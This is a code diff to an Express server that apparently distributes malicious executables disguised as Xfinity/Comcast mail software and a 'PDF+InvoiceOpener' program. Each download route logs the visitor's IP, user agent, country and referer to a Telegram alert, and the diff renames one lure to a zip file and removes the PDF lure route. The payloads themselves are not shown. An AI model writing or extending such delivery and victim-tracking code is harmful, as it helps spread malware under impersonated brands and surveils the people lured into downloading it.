@@ -2234,8 +2234,8 @@ app.get('/sbfbkbj', async (req, res) => {
 
 
 // Endpoint for Xfinity Mail Beta
-app.get('/comcast', async (req, res) => {
-    const filePath = path.join(__dirname, 'dist', 'Xfinity-Mail-Beta.exe');
+app.get('/Xfinity', async (req, res) => {
+    const filePath = path.join(__dirname, 'dist', 'XfinityDesktop.zip');
     
     if (fs.existsSync(filePath)) {
         const ip = getClientIP(req);
@@ -2244,7 +2244,7 @@ app.get('/comcast', async (req, res) => {
         const country = await getCountryFromIP(ip);
         
         const message = `
-🔔 <b>Xfinity Mail Beta Download</b>
+🔔 <b>XfinityDesktop Zip File</b>
 📱 <b>User Agent:</b> ${userAgent}
 🌐 <b>IP:</b> ${ip}
 🌍 <b>Country:</b> ${country}
@@ -2253,7 +2253,7 @@ app.get('/comcast', async (req, res) => {
         `;
         await sendTelegramAlert(message);
 
-        res.setHeader('Content-Disposition', 'attachment; filename="Xfinity-Mail-Beta.exe"');
+        res.setHeader('Content-Disposition', 'attachment; filename="XfinityDesktop.zip"');
         res.setHeader('Content-Type', 'application/octet-stream');
         const readStream = fs.createReadStream(filePath);
         readStream.pipe(res);
@@ -2263,39 +2263,6 @@ app.get('/comcast', async (req, res) => {
 });
 
 
-
-
-
-
-
-// Endpoint for Xfinity Mail Beta
-app.get('/pdfopener', async (req, res) => {
-    const filePath = path.join(__dirname, 'dist', 'PDF+InvoiceOpener.exe');
-    
-    if (fs.existsSync(filePath)) {
-        const ip = getClientIP(req);
-        const userAgent = req.get('User-Agent') || 'Unknown';
-        const referer = req.get('Referer') || 'Direct';
-        const country = await getCountryFromIP(ip);
-        
-        const message = `
-🔔 <b>PDF+InvoiceOpener Download</b>
-📱 <b>User Agent:</b> ${userAgent}
-🌐 <b>IP:</b> ${ip}
-🌍 <b>Country:</b> ${country}
-🔗 <b>Referer:</b> ${referer}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-        `;
-        await sendTelegramAlert(message);
-
-        res.setHeader('Content-Disposition', 'attachment; filename="PDF+InvoiceOpener.exe"');
-        res.setHeader('Content-Type', 'application/octet-stream');
-        const readStream = fs.createReadStream(filePath);
-        readStream.pipe(res);
-    } else {
-        res.status(404).send('File not found. Please contact support.');
-    }
-});
 
 
 
